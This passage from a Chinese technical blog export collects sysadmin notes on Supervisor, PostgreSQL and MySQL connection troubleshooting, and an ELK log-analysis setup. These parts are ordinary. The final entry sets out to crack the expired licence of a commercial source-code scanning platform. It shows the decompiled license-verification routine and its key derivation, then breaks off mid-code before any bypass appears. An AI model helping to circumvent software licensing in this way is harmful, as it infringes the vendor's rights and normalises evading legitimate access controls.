<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重载</span></span><br><span class="line">supervisorctl /etc/supervisord.conf reload</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="管理进程"><a href="#管理进程" class="headerlink" title="管理进程:"></a>管理进程:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf start program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf stop program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf restart program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止全部进程</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf stop all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf update</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="加入启动项"><a href="#加入启动项" class="headerlink" title="加入启动项:"></a>加入启动项:</h2><blockquote>
<p>centos7环境下</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建文件</span></span><br><span class="line">vim /usr/lib/systemd/system/supervisord.service</span><br></pre></td></tr></table></figure>

<p>文件内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># supervisord service for systemd (CentOS 7.0+)</span><br><span class="line"># by ET-CS (https://github.com/ET-CS)</span><br><span class="line">[Unit]</span><br><span class="line">Description=Supervisor daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf</span><br><span class="line">ExecStop=/usr/bin/supervisorctl -c /etc/supervisord.conf shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl -c /etc/supervisord.conf reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=42s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 /usr/lib/systemd/system/supervisord.service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> supervisord.service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动supervisor进程</span></span><br><span class="line">systemctl start supervisord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭supervisor进程</span></span><br><span class="line">systemctl stop supervisord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果修改了supervisor.service文件，可以通过reload命令来重新加载配置文件</span></span><br><span class="line">systemctl reload supervisord</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="定期重启指定进程方法"><a href="#定期重启指定进程方法" class="headerlink" title="定期重启指定进程方法"></a>定期重启指定进程方法</h1><p><code>Supervisor</code>配合<code>crontab</code>可定期重启.</p>
<p>例:每小时重启进程abc </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 * * * * supervisorctl -c /etc/supervisord.conf restart abc</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>初步使用的感觉是,配置起来不麻烦,要重启进程的话也很方便,不用在手打冗长的命令.</p>
<p>但是配置项不算少,要真正用得好,还是要在实践中慢慢定下适合自己程序的配置项.</p>
<p>配置项的介绍可以参考<a href="https://www.rddoc.com/doc/Supervisor/3.3.1/zh/">Supervisor文档</a></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://blog.csdn.net/fdipzone/article/details/80146558">Supervisor定期重启指定进程</a></li>
<li><a href="https://www.rddoc.com/doc/Supervisor/3.3.1/zh/">Supervisor文档</a></li>
<li><a href="https://my.oschina.net/goskyblue/blog/380828">进程管理工具supervisor简介及使用技巧</a></li>
<li><a href="https://github.com/Supervisor/supervisor/issues/980">supervisor crash when config command include java “%t %p” variable</a></li>
<li><a href="https://www.jianshu.com/p/e1c3e6fbae80">在centos7上使用systemd启动supervisor</a></li>
<li><a href="https://www.cnblogs.com/kevingrace/p/7525200.html">Supervisor (进程管理利器) 使用说明 - 运维笔记</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-uwsgi+celery+psycopg2 DB连接问题排错过程</title>
    <url>//28864.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>celery的worker进程中,报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/sqlalchemy/engine/strategies.py&quot;</span>, line <span class="number">106</span>, <span class="keyword">in</span> connect</span><br><span class="line">    <span class="keyword">return</span> dialect.connect(*cargs, **cparams)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/sqlalchemy/engine/default.py&quot;</span>, line <span class="number">412</span>, <span class="keyword">in</span> connect</span><br><span class="line">    <span class="keyword">return</span> self.dbapi.connect(*cargs, **cparams)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/psycopg2/__init__.py&quot;</span>, line <span class="number">130</span>, <span class="keyword">in</span> connect</span><br><span class="line">    conn = _connect(dsn, connection_factory=connection_factory, **kwasync)</span><br><span class="line">OperationalError: (psycopg2.OperationalError) could <span class="keyword">not</span> receive data <span class="keyword">from</span> server: Connection timed out</span><br><span class="line"> (Background on this error at: http://sqlalche.me/e/e3q8)</span><br></pre></td></tr></table></figure>

<p>连接超时,无法取得数据.</p>
<hr>
<h1 id="Debug思路"><a href="#Debug思路" class="headerlink" title="Debug思路:"></a>Debug思路:</h1><h2 id="1-连接数"><a href="#1-连接数" class="headerlink" title="1.连接数:"></a>1.连接数:</h2><p>看到报错 <code>could not receive data from server: Connection timed out</code></p>
<p>一开始觉得是最大连接数的问题.</p>
<p>因为别的正在泡的应用会用<code>pool_size=100</code>的连接池去连接<code>postgresql</code>里的某个数据库,</p>
<p>查询最大连接数<code>show max_connections;</code></p>
<p><img src="https://i.loli.net/2019/05/30/5cef801e4f8e874593.png"></p>
<blockquote>
<p>最大连接连接数默认才100,那么<code>pool_size=100</code>的连接池去连接的话会全部占用了吧…</p>
</blockquote>
<p>再继续查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> max_conn,used,res_for_super,max_conn<span class="operator">-</span>used<span class="operator">-</span>res_for_super res_for_normal </span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) used <span class="keyword">from</span> pg_stat_activity) t1,</span><br><span class="line">  (<span class="keyword">select</span> setting::<span class="type">int</span> res_for_super <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name<span class="operator">=</span>$$superuser_reserved_connections$$) t2,</span><br><span class="line">  (<span class="keyword">select</span> setting::<span class="type">int</span> max_conn <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name<span class="operator">=</span>$$max_connections$$) t3</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/05/30/5cef80989906427300.png"></p>
<p>实际上,并非连接数被占满了,还是有空余的连接数的.</p>
<p>既然还有剩余的,那我这个应用把连接池的<code>pool_size</code>改为<code>10</code>,应该能正常连接上吧.</p>
<p>修改之后,还是报同样的错误不行.</p>
<hr>
<p>搜索了一下,然后根据这个链接<a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
<p>继续排错:</p>
<blockquote>
<p>连接超时错误表明无法通过网络上的设置访问数据库服务器，其方式不会立即返回错误。</p>
<p>根据我的经验，最好的方法是分别对连接的两侧进行故障排除。这意味着首先从psql命令行测试连接的服务器端，然后在解析后测试django端。</p>
</blockquote>
<hr>
<ol>
<li>你能从服务器ping服务器吗？如果没有，请从故障排除网络开始</li>
</ol>
<p><img src="https://i.loli.net/2019/05/30/5cef8390689c218268.png"></p>
<blockquote>
<p>ping 第一个网段的ip 发现会丢包..有点奇怪…</p>
</blockquote>
<p>ping另一个网段的ip</p>
<p><img src="https://i.loli.net/2019/05/30/5cef85fa2890d42171.png"></p>
<blockquote>
<p>不会丢包.难道要用另一个网段的ip来建立数据库连接?</p>
</blockquote>
<hr>
<ol start="2">
<li>你可以使用相同的端口，IP地址等通过psql连接到服务器吗？如果超时，您可能需要检查防火墙和postgresql配置</li>
</ol>
<p>查看postgre 数据库所在的服务器的防火墙设置.发现也正常.</p>
<p>在客户端写了个简单的脚本,发现也连接正常.<br><img src="https://i.loli.net/2019/05/30/5cef8456dc52c19819.png"></p>
<hr>
<h1 id="真正的问题"><a href="#真正的问题" class="headerlink" title="真正的问题:"></a>真正的问题:</h1><p>最终发现.用来连接数据库的内网ip冲突了…</p>
<p>omg…</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><p><a href="https://www.cnblogs.com/xiangnan/p/10051240.html">科学地增加postgresql最大连接数</a></p>
</li>
<li><p><a href="https://docs.sqlalchemy.org/en/13/core/pooling.html#pool-disconnects">SQLAlchemy 1.3文档-连接池</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
</li>
<li><p><a href="http://lists.unbit.it/pipermail/uwsgi/2011-May/002080.html">[uWSGI] Sporadic sqlalchemy errors when using Pylons app with multiple workers</a></p>
</li>
<li><p><a href="http://lists.unbit.it/pipermail/uwsgi/2011-May/002078.html">[uWSGI] Sporadic sqlalchemy errors when using Pylons app with multiple workers</a></p>
</li>
<li><p><a href="https://github.com/heroku-python/django-postgrespool/issues/3">Celery jobs throw exceptions #3</a></p>
</li>
<li><p><a href="http://jorgenmodin.net/index_html/process-safe-connection-pool-for-psycopg2-postgresql">rocess safe connection pool for psycopg2 (postgresql)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-修改Mysql最大连接数</title>
    <url>//63948.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>之前常遇到<code>mysql gone away</code>这类错误,由于用的是<code>sqlalchemy</code>里的<code>Null Pool</code>.即不使用连接池。</p>
<blockquote>
<p>按道理来说,要选用连接池的,但由于还没找到<code>sqlalchemy</code>连接池与celery多进程的最佳实践,故暂时搁置这个方案…</p>
</blockquote>
<p>这样的话,每次在执行sql语句的时候,都会跟数据库建立链接,执行结束后,再释放连接.</p>
<p>这样在高并发的情况下会频繁连接数据库，占用很多连接数.</p>
<p>所以这个时候要适当增大mysql的最大连接数.</p>
<hr>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询:"></a>查询:</h1><p>查询最大连接数</p>
<p><code>show variables like &#39;%max_connections%&#39;;</code></p>
<p>历史最大连接数量</p>
<p><code>show global status like &#39;Max_used_connections&#39;;</code></p>
<hr>
<h1 id="修改最大连接数"><a href="#修改最大连接数" class="headerlink" title="修改最大连接数:"></a>修改最大连接数:</h1><h2 id="修改mysql配置文件"><a href="#修改mysql配置文件" class="headerlink" title="修改mysql配置文件:"></a>修改mysql配置文件:</h2><blockquote>
<p>环境:Centos7</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # and set to the amount of RAM for the most important data</span></span><br><span class="line"><span class="comment"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span></span><br><span class="line"><span class="comment"># innodb_buffer_pool_size = 128M</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # to turn on a very important data integrity option: logging</span></span><br><span class="line"><span class="comment"># changes to the binary log between backups.</span></span><br><span class="line"><span class="comment"># log_bin</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # to set options mainly useful for reporting servers.</span></span><br><span class="line"><span class="comment"># The server defaults are faster for transactions and fast SELECTs.</span></span><br><span class="line"><span class="comment"># Adjust sizes as needed, experiment to find the optimal values.</span></span><br><span class="line"><span class="comment"># join_buffer_size = 128M</span></span><br><span class="line"><span class="comment"># sort_buffer_size = 2M</span></span><br><span class="line"><span class="comment"># read_rnd_buffer_size = 2M</span></span><br><span class="line"><span class="attr">datadir</span>=/var/lib/mysql</span><br><span class="line"><span class="attr">socket</span>=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="attr">port</span>=<span class="number">33066</span></span><br><span class="line"></span><br><span class="line"><span class="attr">max_connections</span>=<span class="number">500</span></span><br><span class="line"><span class="attr">max_allowed_packet</span> = <span class="number">512</span>M</span><br><span class="line"><span class="comment">#query_cache_limit = 4M</span></span><br><span class="line"><span class="attr">wait_timeout</span> = <span class="number">288000</span></span><br><span class="line"><span class="attr">interactive_timeout</span> = <span class="number">288000</span></span><br><span class="line"><span class="attr">read_buffer_size</span> = <span class="number">16</span>M</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disabling symbolic-links is recommended to prevent assorted security risks</span></span><br><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Recommended in standard MySQL setup</span></span><br><span class="line"><span class="attr">sql_mode</span>=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld_safe]</span></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一次只修改了配置文件,也没有及时验证有无修改成功.才发现改了配置文件还不够,还需要继续往下修改.</p>
</blockquote>
<hr>
<h2 id="配置limits-conf"><a href="#配置limits-conf" class="headerlink" title="配置limits.conf:"></a>配置limits.conf:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/security/limits.conf</span><br><span class="line"><span class="comment">#  添加mysql用户配置</span></span><br><span class="line">mysql hard nofile 65535</span><br><span class="line">mysql soft nofile 65535</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="配置mariadb-service"><a href="#配置mariadb-service" class="headerlink" title="配置mariadb.service:"></a>配置mariadb.service:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/mysqld.service</span><br><span class="line"><span class="comment"># 添加参数</span></span><br><span class="line">LimitNOFILE=65535</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启mysql</span></span><br><span class="line">service mysqld restart</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>之前在解决类似的数据库错误的时候,确实是比较难定位到具体的原因.</p>
<p><a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
<blockquote>
<p>连接超时错误表明无法通过网络上的设置访问数据库服务器，其方式不会立即返回错误。</p>
<p>根据我的经验，最好的方法是分别对连接的两侧进行故障排除。这意味着首先从psql命令行测试连接的服务器端，然后在解析后测试django端。</p>
</blockquote>
<p>最好的方法是对涉及到组件(元素)一一去排查原因,不要一直想当然的陷入到代码里.那样会只见树不见林…</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.cnblogs.com/phpper/p/9570792.html">Mysql 连接数,最大并发数设置</a></li>
<li><a href="https://blog.csdn.net/u014074757/article/details/80527445">MySQL配置max_connections无效</a></li>
<li><a href="https://www.cnblogs.com/langdashu/p/5889352.html">MySQL配置文件my.cnf的理解</a></li>
<li><a href="https://dev.mysql.com/doc/refman/8.0/en">MySQL 8.0参考手册</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-日志分析环境搭建</title>
    <url>//61175.html</url>
    <content><![CDATA[<h1 id="下载-amp-安装："><a href="#下载-amp-安装：" class="headerlink" title="下载&amp;安装："></a>下载&amp;安装：</h1><h2 id="java1-8"><a href="#java1-8" class="headerlink" title="java1.8:"></a>java1.8:</h2><p>卸载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rpm -qa|grep java           ／／ 查看jdk的信息</span><br></pre></td></tr></table></figure>

<p>一般将获得如下信息：<br>java-1.4.2-gcj-compat-1.4.2.0-40jpp.115<br>java-1.6.0-openjdk-1.6.0.0-1.7.b09.el5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum -y remove java java-1.4.2-gcj-compat-1.4.2.0-40jpp.115／／ 卸载  </span><br><span class="line">yum -y remove  java-1.6.0-openjdk-1.6.0.0-1.7.b09.el5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --no-cookies --no-check-certificate --header &quot;Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie&quot; &quot;http://download.oracle.com/otn-pub/java/jdk/8u161-b12/2f38c3b165be4555a1fa6e98c45e0808/jdk-8u161-linux-x64.rpm&quot;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="xampp"><a href="#xampp" class="headerlink" title="xampp:"></a>xampp:</h2><p><a href="https://www.cnblogs.com/caicaizi/p/5107834.html">原创）CentOS6.4下安装xampp（一定要在linux上下载）</a></p>
<p><a href="zerfew.blog.163.com/blog/static/193810169201511224353649/">RedHat中xampp的lampp开启失败提示“aaa proftpd[48908]:warning: unable to determine IP address of ‘aaa’”解决办法</a></p>
<hr>
<p>dvwa环境:<code>http://192.168.199.244:8080/dvwa/index.php</code></p>
<hr>
<h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch:"></a>Elasticsearch:</h2><p><code>wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.1.rpm </code></p>
<p><code>sudo rpm --install elasticsearch-5.6.1.rpm </code></p>
<ul>
<li><a href="www.cnblogs.com/yswenli/p/6397351.html">centos 7安装es 及异常处理</a></li>
<li><a href="https://blog.csdn.net/feinifi/article/details/73633235?utm_source=itdadao&utm_medium=referral">elasticsearch启动错误</a></li>
</ul>
<hr>
<h3 id="ElasticSearch分词器设置"><a href="#ElasticSearch分词器设置" class="headerlink" title="ElasticSearch分词器设置"></a>ElasticSearch分词器设置</h3><p><code>http://192.168.0.38:9200/_template/web_apache_template</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;template&quot;: &quot;web-apache-*&quot;,</span><br><span class="line">  &quot;order&quot;:2,</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;  </span><br><span class="line">      &quot;analyzer&quot;: &#123;   </span><br><span class="line">        &quot;charSplit&quot;: &#123;  </span><br><span class="line">          &quot;type&quot;: &quot;custom&quot;,  </span><br><span class="line">              &quot;tokenizer&quot;: &quot;ngram_tokenizer&quot;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;,  </span><br><span class="line">     &quot;tokenizer&quot;: &#123;  </span><br><span class="line">           &quot;ngram_tokenizer&quot;: &#123;  </span><br><span class="line">             &quot;type&quot;: &quot;nGram&quot;,  </span><br><span class="line">             &quot;min_gram&quot;: &quot;1&quot;,  </span><br><span class="line">             &quot;max_gram&quot;: &quot;1&quot;,  </span><br><span class="line">             &quot;token_chars&quot;: [  </span><br><span class="line">               &quot;letter&quot;,  </span><br><span class="line">               &quot;digit&quot;,  </span><br><span class="line">               &quot;punctuation&quot;  </span><br><span class="line">             ]  </span><br><span class="line">           &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;,&quot;mappings&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;apache-access&quot;: &#123;</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">            &quot;raw_request&quot;: &#123;  </span><br><span class="line">					     &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">					     &quot;store&quot;: &quot;yes&quot;,  </span><br><span class="line">					     &quot;analyzer&quot;: &quot;charSplit&quot;</span><br><span class="line">					&#125;,  </span><br><span class="line">            &quot;method&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;offset&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;long&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;auth&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;input_type&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">            &quot;http_version&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;float&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;read_timestamp&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;date&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;source&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;type&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;tags&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;@timestamp&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;date&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;bytes&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;long&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;@version&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;beat&quot;: &#123;</span><br><span class="line">                &quot;properties&quot;: &#123;</span><br><span class="line">                    &quot;hostname&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;name&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;version&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;host&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;client_ip&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;status&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash:"></a>Logstash:</h2><p><code>wget https://artifacts.elastic.co/downloads/logstash/logstash-5.6.1.rpm </code></p>
<p><code>sudo rpm --install logstash-5.6.1.rpm</code></p>
<hr>
<h2 id="Kibana"><a href="#Kibana" class="headerlink" title="Kibana:"></a>Kibana:</h2><p><code>wget https://artifacts.elastic.co/downloads/kibana/kibana-5.6.1-x86_64.rpm </code></p>
<p><code>sudo rpm --install kibana-5.6.1-x86_64.rpm </code></p>
<p>修改<code>/etc/kibana/kibana.yml</code><br>添加<code>server.host:0.0.0.0</code></p>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-某产品license破解记录</title>
    <url>//23692.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808164029.png" alt="20200808164029"><br>海云安的源代码检测平台证书过期了,由于还需要使用一段时间，所以要进行破解。</p>
<hr>
<h1 id="找到验证license的函数"><a href="#找到验证license的函数" class="headerlink" title="找到验证license的函数:"></a>找到验证license的函数:</h1><p>打开登录界面<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808143354.png" alt="20200808143354"></p>
<p>输入用户密码后,由于证书过期了,会自动跳转到<code>updateLicense</code>更新证书界面。</p>
<p>找到<code>License</code>类的<code>ckLicense</code>方法</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808143220.png" alt="20200808143220"></p>
<h1 id="研究ckLicense方法"><a href="#研究ckLicense方法" class="headerlink" title="研究ckLicense方法:"></a>研究ckLicense方法:</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">license</span><span class="params">(String licensefilepath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;licensefilepath：&quot;</span> + licensefilepath);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] publicKey = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;publicKey&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] licenseRSA = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;license&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] licenseInfoDES = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;licenseInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;publicKey：&quot;</span> + publicKey);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseRSA：&quot;</span> + licenseRSA);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseInfoDES：&quot;</span> + licenseInfoDES);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] license = RSACoder.decryptByPublicKey(licenseRSA, publicKey);   <span class="comment">// 用公钥解密</span></span><br><span class="line">        <span class="type">byte</span>[] licenseTypeId = ArrayUtils.addAll(license, <span class="string">&quot;kensite2&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] licenseInfo = DESCoder.decrypt(licenseInfoDES, licenseTypeId);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonLicense</span> <span class="operator">=</span> JSONObject.fromObject(<span class="keyword">new</span> <span class="title class_">String</span>(licenseInfo));</span><br><span class="line"></span><br><span class="line">        System.out.println(jsonLicense);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">company</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;company&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ln</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;license&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">software</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;software&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hrmnum</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;hrmnum&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">expiredate</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;expiredate&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">concurrentFlag</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;concurrentFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;授权公司：&quot;</span> + company);</span><br><span class="line">        System.out.println(<span class="string">&quot;license：&quot;</span> + ln);  <span class="comment">// license</span></span><br><span class="line">        System.out.println(<span class="string">&quot;software：&quot;</span> + software);</span><br><span class="line">        System.out.println(<span class="string">&quot;hrmnum：&quot;</span> + hrmnum);</span><br><span class="line">        System.out.println(<span 